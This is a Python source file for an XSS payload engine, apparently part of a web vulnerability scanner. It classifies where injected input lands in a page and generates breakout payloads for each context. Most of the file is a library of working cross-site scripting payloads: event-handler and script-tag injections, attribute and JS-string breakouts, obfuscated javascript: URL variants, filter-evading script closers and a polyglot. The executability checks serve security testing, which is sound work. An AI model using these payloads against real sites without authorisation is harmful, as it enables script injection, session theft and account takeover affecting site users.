"""Context-aware XSS payload engine.

The engine works in three steps:
  1. inject a benign alphanumeric marker and find where it lands in the DOM
  2. classify the syntactic context (HTML text, attribute value + quote style,
     JS string literal, JS code, comment, RCDATA/textarea/title, CSS, URL attr)
  3. emit payloads that break out of exactly that context

Each payload carries metadata so the detector knows whether a verbatim
reflection is actually executable (this is what separates real findings from
the classic "payload appears in a textarea" false positive).
"""
from __future__ import annotations

import html
import re
import secrets
import string
import urllib.parse
from dataclasses import dataclass

from .htmlparse import URL_ATTRS, ParsedPage

# ---------------------------------------------------------------------------
# Markers
# ---------------------------------------------------------------------------

def new_marker(prefix: str = "xs") -> str:
    return prefix + secrets.token_hex(4)


def new_marker_letters(n: int = 6) -> str:
    """Short marker with no digits, for sinks that strip or truncate values.

    A hex marker loses roughly two fifths of its characters to a filter that
    blocks digits, and any marker longer than the sink's truncation limit is
    invisible.  Both look exactly like "this parameter is not reflected", so a
    second, shorter, letters-only probe is the cheapest way to tell the two
    apart without guessing.
    """
    n = max(4, n)
    return "xs" + "".join(secrets.choice(string.ascii_lowercase) for _ in range(n - 2))


def marker_payload(marker: str) -> str:
    return f"{marker}zqx"


# ---------------------------------------------------------------------------
# Payload model
# ---------------------------------------------------------------------------

@dataclass(frozen=True)
class Payload:
    name: str
    template: str            # uses {M} marker, {JS} execution code
    context: str             # primary context it targets
    needs: str = ""          # characters required to survive, e.g. '<>"'
    interaction: bool = False
    danger: str = "low"      # low / medium / high
    note: str = ""

    def render(self, marker: str, js: str) -> str:
        return self.template.replace("{JS}", js).replace("{M}", marker)


@dataclass
class Reflection:
    context: str
    offset: int
    tag: str = ""
    attr: str = ""
    quote: str = ""
    snippet: str = ""
    in_attr_value: bool = False
    url_attr: bool = False


# ---------------------------------------------------------------------------
# Context classification of a reflected marker
# ---------------------------------------------------------------------------

_RAWTEXT_RE = {
    "textarea": re.compile(r"(?is)<textarea\b[^>]*>(.*?)</textarea>"),
    "title": re.compile(r"(?is)<title\b[^>]*>(.*?)</title>"),
    "style": re.compile(r"(?is)<style\b[^>]*>(.*?)</style>"),
    "xmp": re.compile(r"(?is)<xmp\b[^>]*>(.*?)</xmp>"),
    "noscript": re.compile(r"(?is)<noscript\b[^>]*>(.*?)</noscript>"),
    # Obsolete but still parsed as raw text: closing the element is the only
    # way out, and a reflection inside one used to be reported as nothing.
    "noembed": re.compile(r"(?is)<noembed\b[^>]*>(.*?)</noembed>"),
    "noframes": re.compile(r"(?is)<noframes\b[^>]*>(.*?)</noframes>"),
    # Inert by default: the content is parsed into a document fragment and only
    # runs if application JavaScript clones it.  Reported as a DOM-XSS lead.
    "template": re.compile(r"(?is)<template\b[^>]*>(.*?)</template>"),
    "iframe_srcdoc": re.compile(r"""(?is)srcdoc\s*=\s*(["'])(.*?)\1"""),
}


NON_EXECUTABLE_SCRIPT_TYPES = (
    "json", "importmap", "speculationrules", "text/template", "text/x-template",
    "text/html", "text/plain", "application/x-template",
)


def _executable_script_type(stype: str) -> bool:
    """A <script type=...> block only executes when it is JS-ish or untyped."""
    t = (stype or "").strip().lower()
    if not t:
        return True
    if any(k in t for k in NON_EXECUTABLE_SCRIPT_TYPES):
        return False
    return any(k in t for k in ("javascript", "ecmascript", "module", "babel", "jsx", "typescript"))


def _string_context(body: str, pos_in_script: int) -> str:
    """Scan a script body up to pos and decide whether we're inside a JS string."""
    state = None          # quote char when inside string
    escaped = False
    i = 0
    in_line_comment = False
    in_block_comment = False
    in_regex = False
    last_sig = ""
    while i < pos_in_script and i < len(body):
        ch = body[i]
        nxt = body[i + 1] if i + 1 < len(body) else ""
        if in_line_comment:
            if ch in "\n\r":
                in_line_comment = False
            i += 1
            continue
        if in_block_comment:
            if ch == "*" and nxt == "/":
                in_block_comment = False
                i += 2
                continue
            i += 1
            continue
        if in_regex:
            if escaped:
                escaped = False
            elif ch == "\\":
                escaped = True
            elif ch == "/":
                in_regex = False
            i += 1
            continue
        if state:
            if escaped:
                escaped = False
            elif ch == "\\":
                escaped = True
            elif ch == state:
                state = None
            i += 1
            continue
        if ch == "/" and nxt == "/":
            in_line_comment = True
            i += 2
            continue
        if ch == "/" and nxt == "*":
            in_block_comment = True
            i += 2
            continue
        if ch in "\"'`":
            state = ch
            i += 1
            continue
        if ch == "/" and last_sig in ("=", "(", ",", ":", "[", "!", "&", "|", "?", "{", "}", ";", ""):
            in_regex = True
            i += 1
            continue
        if not ch.isspace():
            last_sig = ch
        i += 1
    if state == '"':
        return "js_string_double"
    if state == "'":
        return "js_string_single"
    if state == "`":
        return "js_template"
    return "js_code"


def _page_ranges(page: ParsedPage) -> tuple[list, list, list]:
    script_ranges = [(s.start, s.end, s.body, s.type) for s in page.scripts]
    comment_ranges = [(c.start, c.end) for c in page.comments]
    rawtext_ranges: list[tuple[int, int, str]] = []
    for kind, rx in _RAWTEXT_RE.items():
        if kind == "iframe_srcdoc":
            continue
        for m in rx.finditer(page.raw):
            rawtext_ranges.append((m.start(1), m.end(1), kind))
    return script_ranges, comment_ranges, rawtext_ranges


def reflection_at(page: ParsedPage, idx: int, ranges=None) -> Reflection:
    """Classify the syntactic context of *idx*, without needing the marker text.

    A sink that mangles its output leaves no exact marker to search for. The
    scanner still knows *where* the value landed (from an efficiency match) and
    needs the context at that position to build a payload that survives it, so
    classification is exposed separately from the marker search.
    """
    raw = page.raw
    script_ranges, comment_ranges, rawtext_ranges = ranges or _page_ranges(page)
    refl = Reflection(context="html_text", offset=idx)

    # inside a <script> body?
    inside_script = False
    for s_start, s_end, body, stype in script_ranges:
        if s_start <= idx < s_end:
            inside_script = True
            if _executable_script_type(stype):
                refl.context = _string_context(body, idx - s_start)
            else:
                # JSON / LD+JSON / template blocks are data: only </script> escapes
                refl.context = "script_data"
                refl.attr = stype
            break
    if not inside_script:
        # inside a comment?
        for c_start, c_end in comment_ranges:
            if c_start <= idx < c_end:
                refl.context = "comment"
                break
        else:
            # RCDATA / rawtext elements
            for r_start, r_end, kind in rawtext_ranges:
                if r_start <= idx < r_end:
                    refl.context = kind
                    break
            else:
                # inside an attribute value?
                hit = None
                for a in page.attrs:
                    if a.start <= idx < a.end:
                        hit = a
                        break
                if hit is not None:
                    refl.tag, refl.attr = hit.tag, hit.name
                    refl.in_attr_value = True
                    refl.url_attr = hit.name in URL_ATTRS
                    if hit.quote == '"':
                        refl.context = "attr_double"
                    elif hit.quote == "'":
                        refl.context = "attr_single"
                    else:
                        refl.context = "attr_unquoted"
                else:
                    # inside a tag but not a value -> attribute position
                    for tag_name, _attrs, pos in page.tags:
                        gt = raw.find(">", pos)
                        if pos <= idx < (gt if gt != -1 else pos + 2000):
                            refl.context = "tag_space"
                            refl.tag = tag_name
                            break
    return refl


def classify_reflections(page: ParsedPage, marker: str, limit: int = 4) -> list[Reflection]:
    """Find every occurrence of the marker and classify its syntactic context."""
    raw = page.raw
    ranges = _page_ranges(page)
    out: list[Reflection] = []
    start = 0
    found = 0
    while found < limit:
        idx = raw.find(marker, start)
        if idx == -1:
            break
        start = idx + len(marker)
        found += 1
        refl = reflection_at(page, idx, ranges)
        lo = max(0, idx - 90)
        hi = min(len(raw), idx + len(marker) + 90)
        refl.snippet = raw[lo:hi].replace("\n", " ")
        out.append(refl)
    return out


# ---------------------------------------------------------------------------
# Payload sets
# ---------------------------------------------------------------------------

def _p(name, template, context, needs="", interaction=False, danger="low", note=""):
    return Payload(name, template, context, needs, interaction, danger, note)


def html_text_payloads():
    return [
        _p("svg-onload", "<svg onload={JS}>", "html_text", "<"),
        _p("img-onerror", "<img src=x onerror={JS}>", "html_text", "<"),
        _p("script-tag", "<script>{JS}</script>", "html_text", "<"),
        _p("details-ontoggle", "<details open ontoggle={JS}>", "html_text", "<"),
        _p("video-source-onerror", "<video><source onerror={JS}></video>", "html_text", "<"),
        _p("body-onload", "<body onload={JS}>", "html_text", "<", danger="medium"),
        _p("iframe-srcdoc", "<iframe srcdoc=\"<script>{JS}</script>\"></iframe>", "html_text", "<\""),
        _p("marquee-onstart", "<marquee onstart={JS}>", "html_text", "<", danger="medium"),
        _p("input-autofocus", "<input autofocus onfocus={JS}>", "html_text", "<"),
        _p("select-autofocus", "<select autofocus onfocus={JS}><option>x</select>", "html_text", "<"),
        _p("math-mglyph", "<math><mtext><table><mglyph><style><!--</style><img title=\"--&gt;<img src=1 onerror={JS}>\">", "html_text", "<", danger="medium"),
        _p("noscript-bypass", "<noscript><p title=\"</noscript><img src=x onerror={JS}>\">", "html_text", "<\""),
        _p("template-content", "<template><svg onload={JS}></template>", "html_text", "<"),
        _p("a-javascript-href", "<a href=\"javascript:{JS}\">click</a>", "html_text", "<\"", interaction=True),
        _p("audio-onerror", "<audio src=x onerror={JS}>", "html_text", "<"),
        _p("svg-animate", "<svg><animate onbegin={JS} attributeName=x dur=1s>", "html_text", "<"),
        _p("form-button", "<form><button formaction=javascript:{JS}>x", "html_text", "<", interaction=True),
        _p("object-data", "<object data=\"javascript:{JS}\">", "html_text", "<\"", interaction=True),
    ]


def attr_payloads(context: str):
    if context == "attr_double":
        return [
            _p("break-svg", "\"><svg onload={JS}>", "attr_double", "\"<"),
            _p("break-img", "\"><img src=x onerror={JS}>", "attr_double", "\"<"),
            _p("break-script", "\"><script>{JS}</script>", "attr_double", "\"<"),
            _p("event-inject", "\" autofocus onfocus={JS} x=\"", "attr_double", "\""),
            _p("mouseover", "\" onmouseover={JS} x=\"", "attr_double", "\"", interaction=True),
            _p("break-iframe-srcdoc", "\"><iframe srcdoc=\"<script>{JS}</script>\">", "attr_double", "\"<"),
            _p("break-details", "\"><details open ontoggle={JS}>", "attr_double", "\"<"),
            _p("break-oninput", "\" oninput={JS} autofocus x=\"", "attr_double", "\""),
            _p("break-audio", "\"><audio src=x onerror={JS}>", "attr_double", "\"<"),
            _p("break-svg-animate", "\"><svg><animate onbegin={JS} attributeName=x dur=1s>", "attr_double", "\"<"),
        ]
    if context == "attr_single":
        return [
            _p("break-svg", "'><svg onload={JS}>", "attr_single", "'<"),
            _p("break-img", "'><img src=x onerror={JS}>", "attr_single", "'<"),
            _p("break-script", "'><script>{JS}</script>", "attr_single", "'<"),
            _p("event-inject", "' autofocus onfocus={JS} x='", "attr_single", "'"),
            _p("mouseover", "' onmouseover={JS} x='", "attr_single", "'", interaction=True),
            _p("break-details", "'><details open ontoggle={JS}>", "attr_single", "'<"),
            _p("break-audio", "'><audio src=x onerror={JS}>", "attr_single", "'<"),
            _p("break-svg-animate", "'><svg><animate onbegin={JS} attributeName=x dur=1s>", "attr_single", "'<"),
        ]
    if context == "attr_unquoted":
        return [
            _p("space-event", " autofocus onfocus={JS} x=", "attr_unquoted"),
            _p("space-mouseover", " onmouseover={JS} x=", "attr_unquoted", interaction=True),
            _p("break-svg", "><svg onload={JS}>", "attr_unquoted", "<"),
            _p("break-tag", "><img src=x onerror={JS}>", "attr_unquoted", "<"),
        ]
    return []


def js_payloads(context: str):
    if context == "js_string_double":
        return [
            _p("close-stmt", "\";{JS};//", "js_string_double", "\""),
            _p("close-stmt2", "\";{JS};var x=\"", "js_string_double", "\""),
            _p("close-bracket", "\"];{JS};//", "js_string_double", "\""),
            _p("break-script", "\"</script><svg onload={JS}>", "js_string_double", "\"<"),
            _p("escape-close", "\\\";{JS};//", "js_string_double", "\\"),
            _p("line-break", "\\n\";{JS};//", "js_string_double", "\\"),
        ]
    if context == "js_string_single":
        return [
            _p("close-stmt", "';{JS};//", "js_string_single", "'"),
            _p("close-stmt2", "';{JS};var x='", "js_string_single", "'"),
            _p("close-bracket", "'];{JS};//", "js_string_single", "'"),
            _p("break-script", "'</script><svg onload={JS}>", "js_string_single", "'<"),
            _p("escape-close", "\\';{JS};//", "js_string_single", "\\"),
        ]
    if context == "js_template":
        return [
            _p("template-expr", "${{{JS}}}", "js_template", "{}"),
            _p("template-break", "`;{JS};//", "js_template", "`"),
            _p("break-script", "`</script><svg onload={JS}>", "js_template", "`<"),
        ]
    return [
        _p("direct", "{JS}", "js_code"),
        _p("semicolon", "1;{JS};//", "js_code"),
        _p("break-script", "</script><svg onload={JS}>", "js_code", "<"),
        _p("paren", ");{JS};(function(){", "js_code"),
        _p("comma", ",{JS},", "js_code"),
        _p("close-object", "};{JS};//", "js_code"),
        # A space or newline before the closing angle still ends the script
        # element, which slips past filters that match "</script>" exactly.
        _p("break-script-space", "</script ><svg onload={JS}>", "js_code", "<"),
        _p("break-script-newline", "</script\n><svg onload={JS}>", "js_code", "<"),
        _p("break-script-slash", "</script/><svg onload={JS}>", "js_code", "<"),
    ]


def comment_payloads():
    return [
        _p("close-comment", "--><svg onload={JS}>", "comment", "<"),
        _p("close-comment-alt", "--!><svg onload={JS}>", "comment", "<"),
        _p("close-comment-img", "--><img src=x onerror={JS}>", "comment", "<"),
        _p("nested", "--><script>{JS}</script>", "comment", "<"),
        _p("close-comment-animate", "--><svg><animate onbegin={JS} attributeName=x dur=1s>", "comment", "<"),
    ]


def rawtext_payloads(context: str):
    tag = {"textarea": "textarea", "title": "title", "style": "style", "xmp": "xmp"}.get(context, context)
    if context == "style":
        return [
            _p("close-style", "</style><svg onload={JS}>", "style", "<"),
            _p("close-style-img", "</style><img src=x onerror={JS}>", "style", "<"),
            _p("css-import", "@import 'javascript:{JS}';", "style", "'"),
            _p("css-expression", "x:expression({JS})", "style", danger="medium"),
        ]
    return [
        _p(f"close-{tag}", "</" + tag + "><svg onload={JS}>", context, "<"),
        _p(f"close-{tag}-img", "</" + tag + "><img src=x onerror={JS}>", context, "<"),
        _p(f"close-{tag}-script", "</" + tag + "><script>{JS}</script>", context, "<"),
    ]


def script_data_payloads():
    """Break out of <script type="application/json"> style data blocks."""
    return [
        _p("close-data-script", "</script><svg onload={JS}>", "script_data", "<"),
        _p("close-data-script-tag", "</script><script>{JS}</script>", "script_data", "<"),
        _p("close-data-script-img", "</script><img src=x onerror={JS}>", "script_data", "<"),
    ]


def tag_space_payloads():
    return [
        _p("attr-event", " onmouseover={JS} x=", "tag_space", interaction=True),
        _p("attr-autofocus", " autofocus onfocus={JS} x=", "tag_space"),
        _p("attr-onload", " onload={JS} x=", "tag_space"),
        _p("close-tag", "><svg onload={JS}>", "tag_space", "<"),
    ]


def url_attr_payloads():
    return [
        _p("js-scheme", "javascript:{JS}", "attr_url", interaction=True),
        _p("js-scheme-slash", "javascript:{JS}//", "attr_url", interaction=True),
        _p("js-scheme-tab", "jav\tascript:{JS}", "attr_url", interaction=True),
        _p("js-scheme-nl", "jav\nascript:{JS}", "attr_url", interaction=True),
        _p("js-scheme-entity", "&#106;avascript:{JS}", "attr_url", interaction=True),
        _p("data-html", "data:text/html,<script>{JS}</script>", "attr_url", interaction=True),
        _p("js-scheme-colon-entity", "javascript&colon;{JS}", "attr_url", interaction=True),
        _p("js-scheme-null", "java\x00script:{JS}", "attr_url", interaction=True),
    ]


def generic_payloads():
    """Tried when context is unknown or as a fallback sweep."""
    return [
        _p("polyglot", "\"'><svg/onload={JS} class=x>", "generic", "<\"'"),
        _p("polyglot2", "javascript:/*--></title></style></textarea></script></xmp><svg/onload={JS}>", "generic"),
        _p("svg-img", "\"><svg><animate onbegin={JS} attributeName=x dur=1s>", "generic", "<\""),
        # A comment opener consumes the rest of the tag in several parsers, so
        # the payload after it is markup even when the reflection sits in a tag.
        _p("polyglot-comment", "<!--><svg onload={JS}>", "generic", "<"),
        # Left unclosed on purpose: a tag at the end of the document still runs.
        _p("polyglot-unclosed", "<svg onload={JS} ", "generic", "<"),
        # For attributes the application quotes with backticks (template strings).
        _p("polyglot-backtick", "`\"><svg onload={JS}>", "generic", "`<\""),
    ]


def polyglot_payload():
    """0xsobky 'Ultimate' polyglot, adapted to a parameterised call."""
    return _p(
        "ultim-polyglot",
        "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk={JS} )//%0D%0A%0d%0a//</stYle/</titLe/"
        "</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd={JS}//>\\x3e",
        "generic", interaction=True, danger="medium",
    )


def payloads_for_context(refl: Reflection) -> list[Payload]:
    ctx = refl.context
    if ctx == "html_text":
        return html_text_payloads()
    if ctx in ("attr_double", "attr_single", "attr_unquoted"):
        if refl.url_attr:
            return url_attr_payloads() + attr_payloads(ctx if ctx != "attr_unquoted" else "attr_double")
        return attr_payloads(ctx)
    if ctx in ("js_string_double", "js_string_single", "js_template", "js_code"):
        return js_payloads(ctx)
    if ctx == "script_data":
        return script_data_payloads()
    if ctx == "comment":
        return comment_payloads()
    if ctx in ("textarea", "title", "style", "xmp", "noscript", "noembed", "noframes"):
        return rawtext_payloads(ctx)
    if ctx == "tag_space":
        return tag_space_payloads()
    return generic_payloads()


# ---------------------------------------------------------------------------
# Reflection validity: is a verbatim reflection actually executable?
# ---------------------------------------------------------------------------

CONTEXT_ESCAPE_NEED = {
    "html_text": "<",
    "attr_double": '"',
    "attr_single": "'",
    "attr_unquoted": " ",
    "js_string_double": '"',
    "js_string_single": "'",
    "js_template": "`",
    "js_code": "",
    "comment": ">",
    "textarea": "<",
    "title": "<",
    "style": "<",
    "xmp": "<",
    "noscript": "<",
    "noembed": "<",
    "noframes": "<",
    "tag_space": " ",
}


def required_survivors(payload: Payload, refl: Reflection) -> str:
    need = CONTEXT_ESCAPE_NEED.get(refl.context, "")
    if payload.context.startswith("attr_") and refl.context.startswith("attr_"):
        need += "<"
    return need


def reflection_is_executable(raw: str, payload_str: str, need: str, occurrences: int = 1) -> bool:
    """Verbatim payload must be present AND its break-out characters must appear raw.

    This blocks the most common false positive: a payload that is reflected but
    HTML-encoded (e.g. &lt;svg onload=...) or sits in a context it cannot escape.
    """
    if not payload_str:
        return False
    idx = raw.find(payload_str)
    if idx == -1:
        return False
    # For repeated reflections, prefer verifying the last one if earlier ones are encoded
    if need:
        window = raw[idx:idx + len(payload_str)]
        for ch in set(need):
            # the character must appear literally inside the reflected payload
            if ch not in window:
                return False
    return True


def encode_analysis(raw: str, injected: str, occurrences: int = 3) -> dict[str, int]:
    """Count how often the injected string appears raw vs escaped per character."""
    result = {"raw": 0, "html_encoded": 0, "url_encoded": 0, "json_escaped": 0, "double_encoded": 0}
    if not injected:
        return result
    result["raw"] = raw.count(injected)
    result["html_encoded"] = sum(
        raw.count(html.escape(injected, quote=q)) for q in (True, False)
    )
    result["url_encoded"] = raw.count(urllib.parse.quote(injected, safe=""))
    result["json_escaped"] = raw.count(injected.replace('"', '\\"').replace("'", "\\'"))
    result["double_encoded"] = raw.count(html.escape(html.escape(injected), quote=True))
    return result


def build_payload_set(js_variant: str = "alert") -> list[Payload]:
    """Every payload we know, for 'brute force' mode without a known context."""
    all_p = []
    all_p += html_text_payloads()
    all_p += attr_payloads("attr_double")
    all_p += attr_payloads("attr_single")
    all_p += attr_payloads("attr_unquoted")
    all_p += js_payloads("js_string_double")
    all_p += js_payloads("js_string_single")
    all_p += js_payloads("js_template")
    all_p += js_payloads("js_code")
    all_p += comment_payloads()
    all_p += rawtext_payloads("textarea")
    all_p += rawtext_payloads("title")
    all_p += script_data_payloads()
    all_p += tag_space_payloads()
    all_p += url_attr_payloads()
    all_p += [polyglot_payload()]
    seen, out = set(), []
    for p in all_p:
        key = p.template.replace("{JS}", "").replace("{M}", "")
        if key in seen:
            continue
        seen.add(key)
        out.append(p)
    return out
